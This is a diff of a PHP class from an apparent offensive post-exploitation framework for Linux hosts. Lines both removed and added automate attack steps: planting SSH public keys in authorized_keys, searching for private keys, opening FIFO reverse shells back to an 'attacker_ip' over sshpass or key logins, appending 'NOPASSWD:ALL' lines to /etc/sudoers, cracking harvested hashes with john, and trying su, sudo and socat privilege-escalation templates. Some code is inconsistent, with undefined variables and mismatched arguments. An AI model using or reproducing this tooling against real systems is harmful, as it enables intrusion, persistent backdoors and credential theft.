@@ -1,179 +1,16 @@
 <?php
 
-class check4linux8misc extends check4linux8enum{
+class check4linux8misc extends check4linux8key{
+
+    
    
-    /*
-     * 
-  https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
+
+  //https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
  
-     * 
-     */
+
     public function __construct($eth,$domain,$ip,$port,$protocol) {
         parent::__construct($eth,$domain,$ip,$port,$protocol);
 
-    }
-    
-    
-    
-    public function key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd){
-        if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
-        else $this->req_str($stream,"openssl rsa -in $private_key_file -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
-        
-        $this->req_str($stream,"ls -al $private_key_file.pem",$this->stream_timeout,"");
-        $this->req_str($stream,"file $private_key_file.pem",$this->stream_timeout,"");
-        $this->req_str($stream,"head -5 $private_key_file.pem",$this->stream_timeout,"");
-    }
-    
-    
-    public function key2gen4priv($stream,$timeout,$private_key_file,$private_key_passwd){
-        $this->ssTitre ( "Gen Private key " );
-        $query = "openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $private_key_file" ;
-        if(!file_exists($private_key_file)) $this->requette($query);
-        else $this->cmd("localhost", $query);
-        
-        $query = "openssl rsa -check -in $private_key_file";
-        $this->req_str($stream,$query,$this->stream_timeout,"");
-        $query = "openssl rsa -in $private_key_file -text -noout";
-        //$this->req_str($stream,$query,$timeout,"");
-        $this->req_str($stream,"ls -al $private_key_file",$this->stream_timeout,"");
-        $this->req_str($stream,"file $private_key_file",$this->stream_timeout,"");
-        $this->key2gen4priv2pem($stream,$this->stream_timeout,$private_key_file,$private_key_passwd);
-        $this->req_str($stream,"head -5 $private_key_file",$this->stream_timeout,"" );
-    }
-    
-    
-    
-    public function key2gen4public($stream,$timeout,$private_key_file, $public_key_file, $private_key_passwd){
-        $this->ssTitre ( "Gen Public key" );
-        $public_key_str = "";
-        if (empty($private_key_file)) {
-            $this->log2error("Empty Private key");
-            return $public_key_str;
-        }
-        var_dump($private_key_passwd);
-        if(!file_exists($public_key_file)) {
-            
-            if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$this->stream_timeout,"");
-            else $this->req_str($stream,"openssl rsa -in $private_key_file -pubout -out $public_key_file.tmp",$timeout ,"");
-            $this->req_str($stream,"head -5 $public_key_file.tmp",$timeout,"" );
-            $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f $public_key_file.tmp > $public_key_file ",$timeout,"");
-            
-        }
-        
-        $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout,"");
-        $this->req_str($stream,"ls -al $public_key_file",$timeout,"");
-        $this->req_str($stream,"file $public_key_file",$timeout,"");
-        $this->req_str($stream,"head -5 $public_key_file",$timeout,"");
-        
-    }
-    
-    
-    public function key2check4add($stream,$remote_username,$password2use,$authorized_keys_filepath,$key2search):bool{
-        $this->ssTitre(__FUNCTION__);
-        
-  
-        
-        
-        $query = "cat $authorized_keys_filepath";
-        $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
-        $this->pause();
-        
-        
-        if(stristr($authorized_keys_str,$key2search)!==FALSE) {
-            $this->log2succes("FOUND Public key - already exist");
-            return TRUE ;
-        }
-        else {
-            $chaine = "Try to Add Public key\n";
-            $this->note($chaine);
-            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath \" ";
-            else $data = "echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath ";
-            
-            $this->req_str($stream,$data,$this->stream_timeout,"");
-            
-            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '$key2search' | tee -a $authorized_keys_filepath \"";
-            else $data = "echo '$key2search' | tee -a $authorized_keys_filepath ";
-            
-            $this->req_str($stream,$data,$this->stream_timeout,"");
-            $this->pause();
-            $query = "cat $authorized_keys_filepath";
-            $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
-            $this->pause();
-            if(stristr($authorized_keys_str,$key2search)!==FALSE) {
-                $this->log2succes("Succes ADD Keys");
-                return TRUE ;
-            }
-            else {
-                $this->log2error("Failed to ADD Keys");
-                return FALSE ;
-            }
-        }
-        
-    }
-    
-    
-    
-    public function key2run($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
-        $this->ssTitre(__FUNCTION__);
-        $result = "";
-        $timeout = 10 ;
-        $remote_username = trim($remote_username);
-        
-        $this->article("Remote Home User", $local_home_user);
-        $this->article("Remote User2use", $remote_username);
-        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username.rsa.priv";
-        $obj_file = new FILE($private_key_ssh_rsa_file);
-        $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-        $pass_phrase = '';
-        $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $pass_phrase);
-        $this->key2gen4public("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file,$pass_phrase);
-        
-        $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
-        $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);
-        
-        
-        if (empty($authorized_keys_filepath)){
-            
-            $this->req_str($stream,"cd $local_home_user; whoami",$this->stream_timeout,"");
-            $query = "cd $local_home_user; ls -al";
-            $this->req_str($stream,$query,$this->stream_timeout,"");
-            $this->req_str($stream," whoami",$this->stream_timeout,"");
-            $this->req_str($stream,"cd $local_home_user; mkdir ./.ssh",$this->stream_timeout,"");
-            $query = "cd $local_home_user; chmod 777 -R $local_home_user/.ssh";
-            $this->req_str($stream,$query,$this->stream_timeout,"");
-            $query = "cd $local_home_user; echo '$public_keys_str' > $local_home_user/.ssh/authorized_keys";
-            $this->req_str($stream,$query,$this->stream_timeout,"");
-            $query = "cd $local_home_user; ls -al $local_home_user/.ssh";
-            $this->req_str($stream,$query,$this->stream_timeout,"");
-            
-            
-            $query = "chown $local_username  $local_home_user/.ssh/authorized_keys";
-            //$this->req_str($stream,$query,$this->stream_timeout,"");
-            
-            
-            $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
-            $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,"$this->filter_file_path | grep \"authorized_keys\" ");
-            
-        }
-        
-        if (!empty($authorized_keys_filepath)){
-            
-            if ($remote_username === "root" ) $password2use = $this->root_passwd;
-            else $password2use = $this->created_user_pass ;
-            
-            if ($this->key2check4add($stream,$remote_username, $password2use,$authorized_keys_filepath, $public_keys_str)!==FALSE){
-                
-                $ssh_ports = $this->ip2ports4service("ssh");
-                foreach ($ssh_ports as $ssh_open)
-                    if(!empty($ssh_open)) {
-                        $this->key2run8remote($stream, $ssh_open, $local_username, $private_key_ssh_rsa_file);
-                        
-                    }
-                
-            }
-            
-        }
-        return $result;
     }
     
 
@@ -377,12 +214,26 @@ lxc launch SomeAlias MyMachine
         $username = trim($username);
         $userpass = trim($userpass);
         $ssh_port = trim($ssh_port);
+
         
-        $template_id_euid = "sshpass -p '$userpass' ssh $username@$this->ip -p $ssh_port -C \"%ID%\" ";
-        $query = str_replace("%ID%","id", $template_id_euid);
-        $this->requette($query);
-        //$this->pentest8id($stream,$template_id_euid);
-        //===============================================================
+        $stream = $this->stream8ssh8passwd($this->ip,$ssh_port,$username,$userpass);;
+        
+        if(is_resource($stream)){
+            $info = "SSH Pass:$userpass";
+            $this->log2succes($info);
+            $template_shell = "sshpass -p '$userpass' ssh $username@$this->ip -p $ssh_port -C \"%SHELL%\" -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null ";
+            
+            $templateB64_shell = base64_encode($template_shell);
+            $attacker_ip = $this->ip4addr4target($this->ip);
+            $attacker_port = rand(1024,65535);
+            $shell = "/bin/bash";
+            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
+            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
+            
+            $lprotocol = 'T' ;
+            $type = "server";
+            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
+        }
     }
     
     public function misc2user8pass8local($stream,$username,$userpass,$ssh_port){
@@ -398,216 +249,7 @@ lxc launch SomeAlias MyMachine
     }
     
      
-    
-    public function key2run8local($stream,$username,$remote_privkey_path,$ssh_port){
-        $this->ssTitre(__FUNCTION__);
-        $username = trim($username);
-        $remote_privkey_path = trim($remote_privkey_path);
-        $ssh_port = trim($ssh_port);
 
-        $template_id_euid = "ssh -i $remote_privkey_path  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
-
-        $this->pentest8id($stream,$template_id_euid);
-        //===============================================================
-    }
-
- 
-    
-    public function key2authorized_keys_file($stream,$authorized_keys_filepath){
-        $this->ssTitre(__FUNCTION__);
-        //===============================================================
-
-            if (!empty($authorized_keys_filepath)){
-                $query = "cat $authorized_keys_filepath";
-                $authorized_keys_str = trim($this->req_ret_str($query));
-                $local_username = "";
-                $local_home_user = "";
-                $ip2users = $this->ip2users4passwd();
-                foreach ($ip2users as $remote_username => $remote_userpass)
-                    $this->key2run($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
-            
-        }
-        //===============================================================
-        
-    }
-    
-    
-    public function key4authorized_keys_file($stream,$path2search){
-        $this->ssTitre(__FUNCTION__);
-        //===============================================================
-        $data = "find $path2search -name \"authorized_keys\" -exec cat {} 2>/dev/null \;";
-        $filter = "";
-        $this->req_str($stream,$data,$this->stream_timeout*3,$filter);
-        
-        $data = "find $path2search -iname \"authorized_keys\" -type f -exec ls -la {} \; 2>/dev/null ";
-        $filter = " $this->filter_file_path | grep 'authorized_keys ";
-        $authorized_keys_filepath = $this->req_str($stream,$data,$this->stream_timeout*3,$filter);
-        $public_key_ssh_rsa_file_tab_remote = explode("\n",$authorized_keys_filepath);
-        $this->pause();
-        
-        foreach ($public_key_ssh_rsa_file_tab_remote as $authorized_keys_filepath){
-            $this->key2authorized_keys_file($stream,$authorized_keys_filepath);
-        }
-        //===============================================================
-        
-    }
-    
-
-    
-    public function key4add($stream,$path2search){
-        $this->ssTitre(__FUNCTION__);
-        $tab_home = array();
-        $this->note("home user");
-        $data = "ls -dl $path2search.home/* 2>/dev/null ";
-        $filter = "| awk '{print $9}' $this->filter_file_path ";
-        $tab_home = $this->req_tab($stream,$data,$this->stream_timeout,$filter);
-        var_dump($tab_home);
-        $this->pause();
-        $data = "ls -dl $path2search.root 2>/dev/null ";
-        $filter = "| awk '{print $9}' $this->filter_file_path ";
-        $tab_home[] = $this->req_str($stream,$data,$this->stream_timeout,$filter);
-        $tab_home = array_reverse($tab_home);
-        $this->article("All Home User", $this->tab($tab_home));
-        //$tab_home = array("/home/nightfall");
-        if (isset($tab_home[0])){
-            foreach ($tab_home as $home_user){
-                $home_user = trim($home_user);
-                if (!empty($home_user)) $this->key2add($stream,$home_user);
-            }
-        }
-        
-    }
-    
-    public function key2add($stream,$home_user,$pubkey_str){
-        $this->ssTitre(__FUNCTION__);
-        $remote_username = "";
-        $tmp = array();
-        $this->article("home user",$home_user);
-
-        $query = "echo '$home_user' $this->filter_file_path | sed \"s#/tmp/$this->ip.$this->port.nfs##g\"  | sed \"s#/home/##g\" | sed \"s#/##g\" | grep -Po \"[a-z0-9\_]{1,}\" ";
-        exec($query,$tmp);
-        $this->requette($query);
-        if (isset($tmp[0])) $remote_username = trim($tmp[0]);
-        
-        $this->article("Remote Username", $remote_username);
-        if (!empty($remote_username)) {
-            $this->req_str($stream,"cd $home_user; whoami",$this->stream_timeout,"");
-            $query = "cd $home_user; ls -al";
-            $this->req_str($stream,$query,$this->stream_timeout,"");
-            $this->req_str($stream," whoami",$this->stream_timeout,"");
-            if (!$this->file4exist8path($stream, "$home_user/.ssh")){
-            $this->req_str($stream,"cd $home_user; mkdir $home_user/.ssh",$this->stream_timeout,"");
-            $query = "cd $home_user; chmod 777 -R $home_user/.ssh";
-            $this->req_str($stream,$query,$this->stream_timeout,"");
-            }
-            if (!$this->file4exist8path($stream, "$home_user/.ssh/authorized_keys")){
-            $query = "cd $home_user; echo '$pubkey_str' > $home_user/.ssh/authorized_keys";
-            $this->req_str($stream,$query,$this->stream_timeout,"");
-            }
-
-        }
-        $query = "cd $home_user; ls -al $home_user/.ssh";
-        $this->req_str($stream,$query,$this->stream_timeout,"");
-        
-        if (!$this->file4search8path($stream, "$home_user/.ssh/authorized_keys", $pubkey_str)) return TRUE;
-        else return FALSE;
-        
-    }
-    
-    public function key4info($stream){
-        $this->ssTitre(__FUNCTION__);
-        //===============================================================
-        $data = "ls -alR ~/.ssh ";
-        $this->req_str($stream,$data,$this->stream_timeout,"");
-        
-        $this->note("Can private-key information be found?");
-        $data = "ls /home/*\/.ssh/*";
-        $this->req_str($stream,$data,$this->stream_timeout,"");
-        
-        $data = "grep -v -e '^$' /etc/ssh/config ";
-        $this->req_str($stream,$data,$this->stream_timeout,"");       
-        
-        $data = "grep -v -e '^$' /etc/ssh/ssh_config | grep -v \"^#\"";
-        $this->req_str($stream,$data,$this->stream_timeout,"");
-        
-        $data = "grep 'PubkeyAuthentication' /etc/ssh/ssh_config ";
-        $this->req_str($stream,$data,$this->stream_timeout,"");
-
-        $this->note("checks for if various ssh files are accessible");
-        $data = "find / \( -name \"*_dsa\" -o -name \"*_rsa\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" \) -exec ls -la {} 2>/dev/null \;";
-        $this->req_str($stream,$data,$this->stream_timeout*3,"");
-        
-        $data = "grep \"PermitRootLogin\" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" ";
-        $check_root_acces = trim($this->req_str($stream,$data,$this->stream_timeout,""));
-        if(stristr($check_root_acces,"PermitRootLogin yes")!==FALSE) $this->log2succes("Yes Root Access is Permited");
-        if(stristr($check_root_acces,"PermitRootLogin no")!==FALSE) $this->note("Root Access is Not Permited");
-    }
-
-
-    
-    
-    public function key2run8remote($stream,$username,$local_privkey_path,$ssh_port, $ssh_open){
-        $this->titre(__FUNCTION__);
-        
-        $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $username, $local_privkey_path,"");
-        if(is_resource($stream)){
-            $info = "SSH Private Key:$local_privkey_path";
-            $this->log2succes($info);
-            $template_shell = "ssh -i $local_privkey_path -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $local_username@$this->ip -p $ssh_open -C  '%SHELL%'";
-            $templateB64_shell = base64_encode($template_shell);
-            $attacker_ip = $this->ip4addr4target($this->ip);
-            $attacker_port = rand(1024,65535);
-            $shell = "/bin/bash";
-            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
-            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
-            $lport = $ssh_open;
-            $lprotocol = 'T' ;
-            $type = "server";
-            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
-        }
-    }
-  
-    public function key2list2path($stream,$path2search):array{
-        $this->titre(__FUNCTION__);
-        $data = "find $path2search \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls {} 2>/dev/null \;";
-        $filter = "| grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
-        return  $this->req_tab($stream,$data,$this->stream_timeout*3,$filter);
-    }
-    
-    public function key4users($stream,$path2search){
-        $this->titre(__FUNCTION__);
-        $tab_privkeys = array();
-        $ssh_ports = $this->ip2ports4service("ssh");
-        if (!empty($ssh_ports)){
-            
-        $tab_privkeys = $this->key2list2path($stream,$path2search);
-        $this->pause();
-        
-        $this->article("All Priv Keys Location", $this->tab($tab_privkeys));
-        $tab_users_shell = $this->ip2users4shell();
-        if (empty($tab_users_shell)) $tab_users_shell = $this->ip2users();
-        
-        //$tab_users_shell = array("hbeale");
-        //$tab_privkeys = array("/media/USB_1/Stuff/Keys/id_rsa");
-        
-        if (!empty($tab_privkeys)){
-            foreach ($tab_privkeys as $remote_privkey_path){
-                $remote_privkey_path = trim($remote_privkey_path);
-                foreach ($tab_users_shell as $username){                    
-                    foreach ($ssh_ports as $ssh_port){
-                        if ( !empty($username) && !empty($ssh_port) ) {
-                            $this->key2run8remote($stream, $ssh_port, $username, $local_privkey_path, $ssh_port);
-                            $this->key2run8local($stream,$username, $remote_privkey_path, $ssh_port);
-                        }
-            }
-                }
-            }
-       
-        }
-        }
-    }
-    
-    
     public function users2pass($stream,$user2name, $user2pass){
         $this->titre(__FUNCTION__);
         $ssh_ports = $this->ip2ports4service("ssh");
@@ -616,6 +258,7 @@ lxc launch SomeAlias MyMachine
             $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);        
             $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
             $this->users2user($stream,$user2name, $user2pass);
+            $this->misc2etc_sudoers($stream,$user2name, $user2pass);
         }
     }
     
@@ -631,24 +274,14 @@ lxc launch SomeAlias MyMachine
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name)) {
                 if (!$this->ip2root8db($this->ip2id)) {
-                  $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);
-                  $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
+                    $this->users2pass($stream,$user2name, $user2pass);
                 }
             }
         }
     }
     }
     
-    
-    public function key($stream,$path2search){
-        $this->titre(__FUNCTION__);
-        $this->key4info($stream,$path2search);$this->pause(); 
-        $this->key4users($stream,$path2search);$this->pause(); // OK                
-        $this->key4authorized_keys_file($stream,$path2search);$this->pause();
-        
-    }
-    
-    
+
     
     public function misc4passwd($stream){
         
@@ -748,8 +381,8 @@ lxc launch SomeAlias MyMachine
             $tmp_pass = array();
             
             exec("echo '$users_pass_found' | grep ':' > $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd   ");
-            if (!file_exists("$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot")) $this->requette("john $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd --pot=$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot --fork=12 --wordlist:\"$this->dico_password\" ");
-            $result .= $this->req_ret_str("john --show $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd");
+            if (!file_exists("$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot")) $this->requette("/opt/john/john $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd --pot=$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot --fork=12 --wordlist:\"$this->dico_password\" ");
+            $result .= $this->req_ret_str("/opt/john/john --show $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd");
             $tab_user2pass = $this->req_ret_tab("cat $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd 2> /dev/null | grep ':' ");
             
             if (!empty($tab_user2pass)){
@@ -862,19 +495,33 @@ If the user does not have a password, then the password field will have an *(ast
         return $result;
    }
     
+   public function misc2etc_sudoers($stream,$user2name,$user2pass){
+       $this->ssTitre(__FUNCTION__);
+       $etc_sudoers_path = "/etc/sudoers";
+       $user2name = trim($user2name);
+       $user2pass  = trim($user2pass);
+       
+       $search = "$user2name ALL=(ALL:ALL) NOPASSWD:ALL";
+       if (!$this->file4search8path($stream,$etc_sudoers_path, $search)){
+           $this->file4add($stream,$etc_sudoers_path, $search);
+       }
+       $template_id_euid = "echo '$user2pass' | sudo -S /bin/bash -c \"%ID%\" ";
+       $this->pentest8id($stream,$template_id_euid);
+       
+   }
     
-   public function misc2etc_sudoers($stream){
+   public function misc4etc_sudoers($stream){
         $this->ssTitre(__FUNCTION__);
-        $etc_sudoers_path = "/etc/sudoers";
-        $obj_filename = new FILE($etc_sudoers_path);
-        $search = "$this->uid_name ALL=(ALL:ALL) NOPASSWD:ALL";
         
-        if ($this->file4writable($obj_filename->file_path)){
-            if (!$this->file4search($obj_filename->file_path, $search)){
-                $this->file4add($obj_filename->file_path, $search);
+        $users_passwd = $this->ip2users4passwd();
+        foreach ($users_passwd as $user2name => $user2pass){
+            if (!empty($user2name)) {
+                if (!$this->ip2root8db($this->ip2id)) {
+                    $this->misc2etc_sudoers($stream,$user2name,$user2pass);
+                }
             }
-            $this->users4root($this->uid_name, '');
         }
+
     }
     
   
@@ -1056,6 +703,11 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     
     public function users($stream){
         $this->titre(__FUNCTION__);
+        $template_id_euid = "sudo bash -c '%ID%' ";
+        $this->pentest8id($stream,$template_id_euid);
+        $template_id_euid = "sudo su -c '%ID%' ";
+        $this->pentest8id($stream,$template_id_euid);
+        
         $users_passwd = $this->ip2users4passwd();
         
         foreach ($users_passwd as $user2name => $user2pass){
@@ -1127,10 +779,12 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     
     public function users4user($stream){
         $this->ssTitre(__FUNCTION__);
+
+        
                 $users_passwd = $this->ip2users4passwd();
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name)) {
-                if (!empty($user2pass) && !$this->ip2root8db($this->ip2id) ) $this->users2user($user2name,$user2pass);
+                if (!empty($user2pass) && !$this->ip2root8db($this->ip2id) ) $this->users2user($stream,$user2name,$user2pass);
             }
         }
         
@@ -1142,7 +796,8 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
         $this->ssTitre(__FUNCTION__);
         $user_name = trim($user_name);
         $user_pass = trim($user_pass);
-        
+        $template_id_euid = "sudo su -c '%ID%' ";
+        $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "( sleep $this->stream_timeout ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su $user_name -c '%ID%'\",pty,stderr,setsid,sigint,ctty,sane";
         $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "(sleep 1;echo '$user_pass';sleep 1;) |  su $user_name -c '%ID%'  ";
